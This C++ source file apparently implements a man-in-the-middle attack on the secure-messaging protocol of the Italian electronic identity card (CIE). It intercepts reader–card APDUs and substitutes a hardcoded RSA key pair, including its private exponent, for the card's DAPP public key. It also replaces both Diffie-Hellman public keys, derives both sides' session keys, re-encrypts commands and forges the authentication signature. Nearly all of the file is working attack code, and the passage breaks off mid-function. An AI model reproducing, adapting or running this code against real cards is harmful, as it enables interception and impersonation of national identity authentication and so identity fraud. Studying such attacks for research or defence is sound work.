
#include "CIEP11Template.h"
#include "../CSP/IAS.h"
#include "../PCSC/CardLocker.h"
#include "../Crypto/ASNParser.h"
#include <stdio.h>
#include "../Crypto/AES.h"
#include "../Crypto/RSA.h"
#include "../Crypto/MAC.h"
#include "../Crypto/DES3.h"
#include "../PCSC/PCSC.h"
#include "../Cryptopp/cryptlib.h"
#include "../Cryptopp/asn.h"
#include "../Util/CryptoppUtils.h"
#include "../LOGGER/Logger.h"

using namespace CryptoPP;
using namespace lcp;
using namespace CieIDLogger;

void notifyPINLocked();
void notifyPINWrong(int trials);

void GetCertInfo(CryptoPP::BufferedTransformation & certin,
               std::string & serial,
               CryptoPP::BufferedTransformation & issuer,
               CryptoPP::BufferedTransformation & subject,
               std::string & notBefore,
               std::string & notAfter,
               CryptoPP::Integer& mod,
               CryptoPP::Integer& pubExp);



typedef enum {
  START,
  READ_DAPP_PUBKEY,
  INIT_DH_PARAM,
  DH_KEY_EXCHANGE,
  DAPP,
  END
} STAGE;
STAGE stage = START;
CASNParser parser;
CSHA256 sha256;

uint8_t defModule[] = { 0xba, 0x28, 0x37, 0xab, 0x4c, 0x6b, 0xb8, 0x27, 0x57, 0x7b, 0xff, 0x4e, 0xb7, 0xb1, 0xe4, 0x9c, 0xdd, 0xe0, 0xf1, 0x66, 0x14, 0xd1, 0xef, 0x24, 0xc1, 0xb7, 0x5c, 0xf7, 0x0f, 0xb1, 0x2c, 0xd1, 0x8f, 0x4d, 0x14, 0xe2, 0x81, 0x4b, 0xa4, 0x87, 0x7e, 0xa8, 0x00, 0xe1, 0x75, 0x90, 0x60, 0x76, 0xb5, 0x62, 0xba, 0x53, 0x59, 0x73, 0xc5, 0xd8, 0xb3, 0x78, 0x05, 0x1d, 0x8a, 0xfc, 0x74, 0x07, 0xa1, 0xd9, 0x19, 0x52, 0x9e, 0x03, 0xc1, 0x06, 0xcd, 0xa1, 0x8d, 0x69, 0x9a, 0xfb, 0x0d, 0x8a, 0xb4, 0xfd, 0xdd, 0x9d, 0xc7, 0x19, 0x15, 0x9a, 0x50, 0xde, 0x94, 0x68, 0xf0, 0x2a, 0xb1, 0x03, 0xe2, 0x82, 0xa5, 0x0e, 0x71, 0x6e, 0xc2, 0x3c, 0xda, 0x5b, 0xfc, 0x4a, 0x23, 0x2b, 0x09, 0xa4, 0xb2, 0xc7, 0x07, 0x45, 0x93, 0x95, 0x49, 0x09, 0x9b, 0x44, 0x83, 0xcb, 0xae, 0x62, 0xd0, 0x09, 0x96, 0x74, 0xdb, 0xf6, 0xf3, 0x9b, 0x72, 0x23, 0xa9, 0x9d, 0x88, 0xe3, 0x3f, 0x1a, 0x0c, 0xde, 0xde, 0xeb, 0xbd, 0xc3, 0x55, 0x17, 0xab, 0xe9, 0x88, 0x0a, 0xab, 0x24, 0x0e, 0x1e, 0xa1, 0x66, 0x28, 0x3a, 0x27, 0x4a, 0x9a, 0xd9, 0x3b, 0x4b, 0x1d, 0x19, 0xf3, 0x67, 0x9f, 0x3e, 0x8b, 0x5f, 0xf6, 0xa1, 0xe0, 0xed, 0x73, 0x6e, 0x84, 0xd5, 0xab, 0xe0, 0x3c, 0x59, 0xe7, 0x34, 0x6b, 0x42, 0x18, 0x75, 0x5d, 0x75, 0x36, 0x6c, 0xbf, 0x41, 0x36, 0xf0, 0xa2, 0x6c, 0x3d, 0xc7, 0x0a, 0x69, 0xab, 0xaa, 0xf6, 0x6e, 0x13, 0xa1, 0xb2, 0xfa, 0xad, 0x05, 0x2c, 0xa6, 0xec, 0x9c, 0x51, 0xe2, 0xae, 0xd1, 0x4d, 0x16, 0xe0, 0x90, 0x25, 0x4d, 0xc3, 0xf6, 0x4e, 0xa2, 0xbd, 0x8a, 0x83, 0x6b, 0xba, 0x99, 0xde, 0xfa, 0xcb, 0xa3, 0xa6, 0x13, 0xae, 0xed, 0xd9, 0x3a, 0x96, 0x15, 0x27, 0x3d };
uint8_t defPrivExp[] = { 0x47, 0x16, 0xc2, 0xa3, 0x8c, 0xcc, 0x7a, 0x07, 0xb4, 0x15, 0xeb, 0x1a, 0x61, 0x75, 0xf2, 0xaa, 0xa0, 0xe4, 0x9c, 0xea, 0xf1, 0xba, 0x75, 0xcb, 0xa0, 0x9a, 0x68, 0x4b, 0x04, 0xd8, 0x11, 0x18, 0x79, 0xd3, 0xe2, 0xcc, 0xd8, 0xb9, 0x4d, 0x3c, 0x5c, 0xf6, 0xc5, 0x57, 0x53, 0xf0, 0xed, 0x95, 0x87, 0x91, 0x0b, 0x3c, 0x77, 0x25, 0x8a, 0x01, 0x46, 0x0f, 0xe8, 0x4c, 0x2e, 0xde, 0x57, 0x64, 0xee, 0xbe, 0x9c, 0x37, 0xfb, 0x95, 0xcd, 0x69, 0xce, 0xaf, 0x09, 0xf4, 0xb1, 0x35, 0x7c, 0x27, 0x63, 0x14, 0xab, 0x43, 0xec, 0x5b, 0x3c, 0xef, 0xb0, 0x40, 0x3f, 0x86, 0x8f, 0x68, 0x8e, 0x2e, 0xc0, 0x9a, 0x49, 0x73, 0xe9, 0x87, 0x75, 0x6f, 0x8d, 0xa7, 0xa1, 0x01, 0xa2, 0xca, 0x75, 0xa5, 0x4a, 0x8c, 0x4c, 0xcf, 0x9a, 0x1b, 0x61, 0x47, 0xe4, 0xde, 0x56, 0x42, 0x3a, 0xf7, 0x0b, 0x20, 0x67, 0x17, 0x9c, 0x5e, 0xeb, 0x64, 0x68, 0x67, 0x86, 0x34, 0x78, 0xd7, 0x52, 0xc7, 0xf4, 0x12, 0xdb, 0x27, 0x75, 0x41, 0x57, 0x5a, 0xa0, 0x61, 0x9d, 0x30, 0xbc, 0xcc, 0x8d, 0x87, 0xe6, 0x17, 0x0b, 0x33, 0x43, 0x9a, 0x2c, 0x93, 0xf2, 0xd9, 0x7e, 0x18, 0xc0, 0xa8, 0x23, 0x43, 0xa6, 0x01, 0x2a, 0x5b, 0xb1, 0x82, 0x28, 0x08, 0xf0, 0x1b, 0x5c, 0xfd, 0x85, 0x67, 0x3a, 0xc0, 0x96, 0x4c, 0x5f, 0x3c, 0xfd, 0x2d, 0xaf, 0x81, 0x42, 0x35, 0x97, 0x64, 0xa9, 0xad, 0xb9, 0xe3, 0xf7, 0x6d, 0xb6, 0x13, 0x46, 0x1c, 0x1b, 0xc9, 0x13, 0xdc, 0x9a, 0xc0, 0xab, 0x50, 0xd3, 0x65, 0xf7, 0x7c, 0xb9, 0x31, 0x94, 0xc9, 0x8a, 0xa9, 0x66, 0xd8, 0x9c, 0xdd, 0x55, 0x51, 0x25, 0xa5, 0xe5, 0x9e, 0xcf, 0x4f, 0xa3, 0xf0, 0xc3, 0xfd, 0x61, 0x0c, 0xd3, 0xd0, 0x56, 0x43, 0x93, 0x38, 0xfd, 0x81 };
uint8_t defPubExp[] = { 0x00, 0x01, 0x00, 0x01 };
ByteDynArray module = VarToByteArray(defModule);
ByteDynArray pubexp = VarToByteArray(defPubExp);
ByteDynArray privexp = VarToByteArray(defPrivExp);
BYTE *curr_apdu = NULL;
DWORD curr_apduSize = 0;
BYTE *prev_apdu = NULL;
DWORD prev_apduSize;

//READ_DAPP_PUBKEY
BYTE read_ReadDappPubKey[] = {0x00, 0xa4, 0x02, 0x04, 0x02, 0x10, 0x04};
BYTE adpu_PubKey1[] = {0x00, 0xb0, 0x00, 0x00, 0x80};
BYTE adpu_PubKey2[] = {0x00, 0xb0, 0x00, 0x80, 0x80};
BYTE adpu_PubKey3[] = {0x00, 0xb0, 0x01, 0x00, 0x80};

//INIT_DH_PARAM
ByteDynArray dh_g;
BYTE dh_gBytes[256] = {};
ByteDynArray dh_p;
BYTE dh_pBytes[256] = {};
ByteDynArray dh_q;
BYTE apdu_getDHDuopData_g[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x97, 0x00 };
BYTE apdu_getDHDuopData_getData[] = { 0x00, 0xc0, 0x00, 0x00, 0x12 };
BYTE apdu_getDHDuopData_p[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x98, 0x00 };
BYTE apdu_getDHDuopData_q[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x99, 0x00 };

//DH_KEY_EXCHANGE
BYTE MSE_SET1[] = { 0x10, 0x22, 0x41, 0xa6 };
BYTE MSE_SET2[] = { 0x00, 0x22, 0x41, 0xa6 };
BYTE apdu_GET_DATA_Data1[] = { 0x00, 0xcb, 0x3f, 0xff, 0x06, 0x4d, 0x04, 0xa6, 0x02, 0x91, 0x00 };
BYTE apdu_GET_DATA_Data2[] = { 0x00, 0xc0, 0x00, 0x00, 0x08 };
ByteDynArray dh_IFDpubKey, dh_ICCpubKey;
ByteDynArray dh_pubKey_mitm, dh_prKey_mitm;
BYTE *dh_pubKey_mitmBytes;
BYTE dh_IFDpubKeyBytes[256] = {};
BYTE dh_ICCpubKeyBytes[256] = {};
uint8_t diffENC[] = { 0x00, 0x00, 0x00, 0x01 };
uint8_t diffMAC[] = { 0x00, 0x00, 0x00, 0x02 };
ByteDynArray sessENC_IFD, sessMAC_IFD, sessSSC_IFD;
ByteDynArray sessENC_ICC, sessMAC_ICC, sessSSC_ICC;

//DAPP
uint8_t SelectKey[] = { 0x0c, 0x22, 0x81, 0xb6 };
uint8_t VerifyCert1[] = { 0x1c, 0x2A, 0x00, 0xAE };
uint8_t VerifyCert2[] = { 0x0c, 0x2A, 0x00, 0xAE };
uint8_t SetCHR[] = { 0x0c, 0x22, 0x81, 0xA4 };
uint8_t GetChallenge[] = { 0x0c, 0x84, 0x00, 0x00 };
uint8_t ExtAuth1[] = { 0x1c, 0x82, 0x00, 0x00 };
uint8_t ExtAuth2[] = { 0x0c, 0x82, 0x00, 0x00 };
uint8_t IntAuth[] = { 0x0c, 0x22, 0x41, 0xa4 };
uint8_t GiveRandom[] = { 0x0c, 0x88, 0x00, 0x00 };

uint8_t sn_icc[] = { 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f };
BYTE certenc[354] = {};
BYTE buffer_resp[293] = {};
ByteDynArray challenge;
ByteDynArray chResponse;
uint8_t snIFD[] = { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
ByteArray snIFDBa = VarToByteArray(snIFD);

void increment(ByteArray &seq) {
	for (size_t i = seq.size() - 1; i >= 0; i--) {
		if (seq[i] < 255) {
			seq[i]++;
			for (size_t j = i + 1; j < seq.size(); j++)
				seq[j] = 0;
			return;
		}
	}
}

ByteArray craft_respSM(ByteArray &keyEnc, ByteArray &keySig, ByteDynArray &resp, ByteArray &seq) {
	increment(sessSSC_ICC);
	increment(sessSSC_IFD);
	ByteDynArray calcMac;
	ByteDynArray swBa, tagMacBa;
	ByteDynArray iv(8);
	iv.fill(0); // IV for APDU encryption should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection
	CDES3 encDes(keyEnc, iv);
	CMAC sigMac(keySig, iv);

	calcMac = seq;
	calcMac.append(resp.mid(0, resp[0 + 1] + 2));

	BYTE sw[2] = {0x90, 0x00};
	BYTE tagMac[2] = { 0x8e, 0x08};
	swBa = VarToByteArray(sw);
	tagMacBa = VarToByteArray(tagMac);


	ByteDynArray tmp = resp.mid(0, resp[0 + 1] + 2);
	auto smMac = sigMac.Mac(ISOPad(calcMac));
	resp.set(&tmp, &tagMacBa, &smMac, &swBa);
	return resp;
}


ByteDynArray SM(ByteArray &keyEnc, ByteArray &keySig, ByteArray &apdu, ByteArray &seq) {
	init_func

	std::string dmp;
	ODS(dumpHexData(seq, dmp).c_str());

	increment(sessSSC_ICC);
	increment(sessSSC_IFD);

    ODS(dumpHexData(seq, dmp).c_str());

	ByteDynArray smHead;
	smHead = apdu.left(4);
	smHead[0] |= 0x0C;
//    printf("apdu: %s\n", dumpHexData(smHead).c_str());

	auto calcMac = ISOPad(ByteDynArray(seq).append(smHead));

//    printf("calcMac: %s\n", dumpHexData(calcMac).c_str());

	ByteDynArray iv(8);
	iv.fill(0); // IV for APDU encryption and signature should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection

//    printf("iv: %s\n", dumpHexData(iv).c_str());

//    printf("keyEnc: %s\n", dumpHexData(keyEnc).c_str());
	CDES3 encDes(keyEnc, iv);

//    printf("keySig: %s\n", dumpHexData(keySig).c_str());

    CMAC sigMac(keySig, iv);

	uint8_t Val01 = 1;
//    uint8_t Val00 = 0;

	ByteDynArray datafield, doob;
	if (apdu[4] != 0 && apdu.size() > 5) {

        ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(5, apdu[4])));

//        printf("enc 1: %s\n", dumpHexData(enc).c_str());

		if ((apdu[1] & 1) == 0)
			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
		else
			doob.setASN1Tag(0x85, enc);

		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 1: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 1: %s\n", dumpHexData(datafield).c_str());
	}
	if (apdu[4] == 0 && apdu.size() > 7) {

		ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(7, (apdu[5] << 8)| apdu[6] )));
		if ((apdu[1] & 1) == 0)
			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
		else
			doob.setASN1Tag(0x85, enc);

		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 2: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 2: %s\n", dumpHexData(datafield).c_str());
	}
	if (apdu.size() == 5 || apdu.size() == (apdu[4] + 6)) {
		uint8_t le = apdu[apdu.size() - 1];
        ByteArray leBa = VarToByteArray(le);
		doob.setASN1Tag(0x97, leBa);
		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 3: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 3: %s\n", dumpHexData(datafield).c_str());
	}

    ByteDynArray macBa = sigMac.Mac(ISOPad(calcMac));
//    printf("macBa: %s\n", dumpHexData(macBa).c_str());

    ByteDynArray tagMacBa = ASN1Tag(0x8e, macBa);
//    printf("tagMacBa: %s\n", dumpHexData(tagMacBa).c_str());
	datafield.append(tagMacBa);

//    printf("datafield 4: %s\n", dumpHexData(datafield).c_str());

	ByteDynArray elabResp;
	if (datafield.size()<0x100)
		elabResp.set(&smHead, (uint8_t)datafield.size(), &datafield, (uint8_t)0x00);
	else {
		auto len = datafield.size();
		auto lenBA = VarToByteArray(len);
        ByteArray lenBa = lenBA.reverse().right(3);

		elabResp.set(&smHead, &lenBa, &datafield, (uint8_t)0x00, (uint8_t)0x00);
	}

//    printf("elabResp: %s\n", dumpHexData(elabResp).c_str());
	return elabResp;
}

void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQUEST *pioSendPci) {
	prev_apduSize = curr_apduSize;
	prev_apdu = (BYTE *) realloc(prev_apdu, sizeof(BYTE) * prev_apduSize);
	memcpy(prev_apdu, curr_apdu, prev_apduSize);

	curr_apdu = (BYTE *) realloc(curr_apdu, sizeof(BYTE) * apduSize);
	curr_apduSize = apduSize;
	memcpy(curr_apdu, apdu, apduSize);
	switch (stage) {
	case START:
		if (memcmp(curr_apdu, read_ReadDappPubKey, 7 > apduSize ? 7 : apduSize) == 0) {
			stage = READ_DAPP_PUBKEY;
		}
		break;
	case DH_KEY_EXCHANGE:
		// TODO fix this
		if (memcmp(curr_apdu, MSE_SET1, 4) == 0) {
			do {
				dh_prKey_mitm.resize(dh_q.size());
				dh_prKey_mitm.random();
			} while (dh_q[0] < dh_prKey_mitm[0]);
			dh_prKey_mitm.right(1)[0] |= 1;
			ByteDynArray dhg(dh_g.size());
			dhg.fill(0);
			dhg.rightcopy(dh_g);

			LOG_DEBUG("dh_p:");
			LOG_BUFFER(dh_p.data(), dh_p.size());
			CRSA rsa(dh_p, dh_prKey_mitm);

			dh_pubKey_mitm = rsa.RSA_PURE(dhg);
			dh_pubKey_mitmBytes = dh_pubKey_mitm.data();
			
			memcpy(dh_IFDpubKeyBytes, apdu+15, apduSize-15);
			// copy in apdu+15 from dh_pubKey_mitmBytes apduSize-15 bytes
			memcpy(apdu+15, dh_pubKey_mitmBytes, apduSize-15);
		}else if (memcmp(curr_apdu, MSE_SET2, 4) == 0) {
			memcpy(dh_IFDpubKeyBytes+245, apdu+5, 11);
			// copy in apdu+5 from dh_pubKey_mitmBytes+245 11 bytes
			memcpy(apdu+5, dh_pubKey_mitmBytes+245, 11);
	
		}
		
		break;
	case DAPP:
		if (memcmp(apdu, SelectKey, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[8];
			memcpy(supp,apdu+8,8);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x81, 0xb6 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, le);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, VerifyCert1, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[232];
			memcpy(supp,apdu+9,232);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x10, 0x2A, 0x00, 0xAE };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, VerifyCert2, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[128];
			memcpy(supp,apdu+9,128);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x2A, 0x00, 0xAE };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, SetCHR, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[16];
			memcpy(supp,apdu+8,16);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x81, 0xA4 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, GetChallenge, 4) == 0) {
			ByteDynArray smApdu;
			uint8_t chLen = 8;
			BYTE head[] = { 0x00, 0x84, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			ByteDynArray data = ByteDynArray();
			smApdu.set(&headBa, (uint8_t)data.size(), &data, chLen);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, ExtAuth1, 4) == 0) {
			ByteDynArray toHash, toSign;
			size_t padSize = 222;
			ByteDynArray PRND(padSize);
			PRND.random();
			toHash.set(&PRND, &dh_pubKey_mitm, &snIFDBa, &challenge, &dh_ICCpubKey, &dh_g, &dh_p, &dh_q);
    		ByteDynArray toHashBa = sha256.Digest(toHash);
			toSign.set(0x6a, &PRND, &toHashBa, 0xBC);
		
			CRSA certKey(module, privexp);
		
			ByteDynArray signResp = certKey.RSA_PURE(toSign);
			chResponse.set(&snIFDBa, &signResp);

			BYTE supp[231];
			memcpy(supp,chResponse.data(),231);
			ByteArray data = VarToByteArray(supp);
			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x10, 0x82, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("Remaining: %d", chResponse.size()-231);
		} else if (memcmp(apdu, ExtAuth2, 4) == 0) {
			BYTE supp[33];
			memcpy(supp,chResponse.data() + 231,33);
			ByteArray data = VarToByteArray(supp);
			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x82, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, IntAuth, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[8];
			memcpy(supp,apdu+8,8);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x41, 0xa4 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, GiveRandom, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[16];
			memcpy(supp,apdu+8,16);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x88, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		}
		
		break;
	default:
		break;
	}
}

void mitm_in(BYTE *resp, DWORD *respSize) {
	switch (stage) {
	case START:
		break;
	case READ_DAPP_PUBKEY:
		LOG_DEBUG("READ_DAPP_PUBKEY");
		if (memcmp(curr_apdu, adpu_PubKey1, 5) == 0) {
			// substitute from 9 for respSize-11
			// with the first respSize-8 bytes of defModule
			memcpy(resp+9, defModule, (*respSize)-11);
		}else if (memcmp(curr_apdu, adpu_PubKey2, 5) == 0) {
			// substitute from 0 for respSize-2
			// with respSize-2 bytes of defModule+119
			memcpy(resp, defModule+119, (*respSize)-2);
		}else if (memcmp(curr_apdu, adpu_PubKey3, 5) == 0) {
			// substitute from 0 for 9
			// with 9 bytes of defModule+247
			memcpy(resp, defModule+247, 9);
			stage = INIT_DH_PARAM;
		}
		break;
	case INIT_DH_PARAM:
		LOG_DEBUG("INIT_DH_PARAM");
		if (memcmp(curr_apdu, apdu_getDHDuopData_g, 17) == 0) {
			memcpy(dh_gBytes, resp+18, (*respSize)-20);
		}
		if (memcmp(curr_apdu, apdu_getDHDuopData_p, 17) == 0) {
			memcpy(dh_pBytes, resp+18, (*respSize)-20);
		}
		if (memcmp(curr_apdu, apdu_getDHDuopData_q, 17) == 0) {
			BYTE temp[42] = {};
			memcpy(temp, resp, 42); 
			ByteArray respBa = VarToByteArray(temp);
			parser.Parse(respBa);
			dh_q = parser.tags[0]->tags[0]->tags[0]->tags[0]->content;
			stage = DH_KEY_EXCHANGE;
		}

		if (memcmp(curr_apdu, apdu_getDHDuopData_getData, 5) == 0) {
			LOG_DEBUG("prev_apdu:");
			LOG_BUFFER(prev_apdu, prev_apduSize);
			if (memcmp(prev_apdu, apdu_getDHDuopData_g, 17) == 0) {
				memcpy(dh_gBytes+238, resp, 18);
				dh_g = VarToByteDynArray(dh_gBytes);
			}
			if (memcmp(prev_apdu, apdu_getDHDuopData_p, 17) == 0){
				memcpy(dh_pBytes+238, resp, 18);
				LOG_BUFFER(dh_pBytes, 256);
				dh_p = VarToByteDynArray(dh_pBytes);
			}
		}

		break;
	case DH_KEY_EXCHANGE:
		LOG_DEBUG("DH_KEY_EXCHANGE");
		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {
			//do {
			//	dh_ICCprKey_mitm.resize(dh_q.size());
			//	dh_ICCprKey_mitm.random();
			//} while (dh_q[0] < dh_ICCprKey_mitm[0]);
			//dh_ICCprKey_mitm.right(1)[0] |= 1;
			//ByteDynArray dhg(dh_g.size());
			//dhg.fill(0);
			//dhg.rightcopy(dh_g);
			//CRSA rsa(dh_p, dh_ICCprKey_mitm);
			//
			//dh_ICCpubKey_mitm = rsa.RSA_PURE(dhg);
			//dh_ICCpubKey_mitmBytes = dh_ICCpubKey_mitm.data();
			
			memcpy(dh_ICCpubKeyBytes, resp+8, 248);
			//
			memcpy(resp+8, dh_pubKey_mitmBytes, 248);
		} else if (memcmp(curr_apdu, apdu_GET_DATA_Data2, 5) == 0) {
			memcpy(dh_ICCpubKeyBytes+248, resp, 8);
			//
			memcpy(resp, dh_pubKey_mitmBytes+248, 8);
			
			dh_ICCpubKey = VarToByteDynArray(dh_ICCpubKeyBytes);
			dh_IFDpubKey = VarToByteDynArray(dh_IFDpubKeyBytes);

			CRSA rsa(dh_p, dh_prKey_mitm);
			ByteDynArray secretIFD = rsa.RSA_PURE(dh_IFDpubKey);
			sessENC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffENC))).left(16);
			sessMAC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffMAC))).left(16);

			ByteDynArray secretICC = rsa.RSA_PURE(dh_ICCpubKey);
			sessENC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffENC))).left(16);
			sessMAC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffMAC))).left(16);
		
			sessSSC_IFD.resize(8);
			sessSSC_IFD.fill(0);
			sessSSC_IFD[7] = 1;

			sessSSC_ICC.resize(8);
			sessSSC_ICC.fill(0);
			sessSSC_ICC[7] = 1;

			LOG_DEBUG("sessENC_IFD");
			LOG_BUFFER(sessENC_IFD.data(), sessENC_IFD.size());
			LOG_DEBUG("sessENC_ICC");
			LOG_BUFFER(sessENC_ICC.data(), sessENC_ICC.size());
			stage = DAPP;
		}
		break;
	case DAPP:
			if (memcmp(curr_apdu, GetChallenge, 4) == 0) {
				
				ByteDynArray iv(8);
				iv.fill(0);
				CDES3 encDes_ICC(sessENC_ICC, iv);
				BYTE tmp[16] = {};
				memcpy(tmp, resp+3, 16);
				
				ByteArray encData;
				encData = VarToByteArray(tmp);
				LOG_DEBUG("encData:");
				LOG_BUFFER(encData.data(), encData.size());
				challenge = encDes_ICC.RawDecode(encData);
				challenge.resize(RemoveISOPad(challenge),true);
				LOG_DEBUG("Challenge:");
				LOG_BUFFER(challenge.data(), challenge.size());
				//crafting the response
				increment(sessSSC_ICC);
				increment(sessSSC_IFD);
				CDES3 encDes_IFD(sessENC_IFD, iv);
				CMAC sigMac_IFD(sessMAC_IFD, iv);
				ByteDynArray encChallenge;
				encChallenge = encDes_IFD.RawEncode(ISOPad(challenge));
				ByteDynArray datafield;
				uint8_t Val01 = 1;
				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encChallenge));
				ByteDynArray calcMac = sessSSC_IFD;
				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
				calcMac.append(datafield).append(VarToByteDynArray(macTail));
				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
